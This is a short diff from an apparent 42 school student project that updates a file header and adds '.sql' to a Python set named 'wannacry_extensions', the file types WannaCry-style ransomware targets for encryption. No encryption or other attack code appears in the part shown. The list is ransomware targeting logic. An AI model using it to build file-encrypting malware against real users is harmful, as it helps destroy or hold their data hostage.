@@ -6,7 +6,7 @@
 #    By: sleleu <sleleu@student.42.fr>              +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2023/09/23 03:21:01 by sleleu            #+#    #+#              #
-#    Updated: 2023/09/23 03:43:15 by sleleu           ###   ########.fr        #
+#    Updated: 2023/09/23 04:09:46 by sleleu           ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -21,7 +21,7 @@ wannacry_extensions: set[str] = {
     ".dotm", ".ost", ".vdi", ".png", ".asf", ".vb", ".db", ".sxc",
     ".dotx", ".msg", ".vmdk", ".gif", ".mpeg", ".vbs", ".mdb", ".ots",
     ".xls", ".eml", ".vmx", ".raw", ".vob", ".ps1", ".accdb", ".ods",
-    ".xlsm", ".vsd", ".aes", ".tif", ".wmv", ".cmd", ".sqlitedb", ".max",
+    ".xlsm", ".vsd", ".aes", ".tif", ".wmv", ".cmd", ".sql", ".sqlitedb", ".max",
     ".xlsb", ".vsdx", ".ARC", ".tiff", ".fla", ".js", ".sqlite3", ".3ds",
     ".xlw", ".txt", ".PAQ", ".nef", ".swf", ".asm", ".asc", ".uot",
     ".xlt", ".csv", ".bz2", ".psd", ".wav", ".h", ".lay6", ".stw",
